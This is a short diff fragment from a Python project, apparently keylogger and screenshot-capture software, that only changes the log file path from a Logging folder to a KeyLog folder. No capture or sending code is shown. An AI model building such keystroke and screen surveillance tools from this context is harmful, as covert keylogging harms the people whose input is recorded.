@@ -41,7 +41,7 @@ def capture_SS(file_name: str = "Picture.png", overwrite: bool = True) -> str:
 
 
 def logger(duration: int) -> str:
-    file_path: str = "src\\Logging\\keylog.txt"
+    file_path: str = "src\\KeyLog\\keylog.txt"
     # ? Ensure the existence of the file
     with open(file_path, "w") as f:
         pass
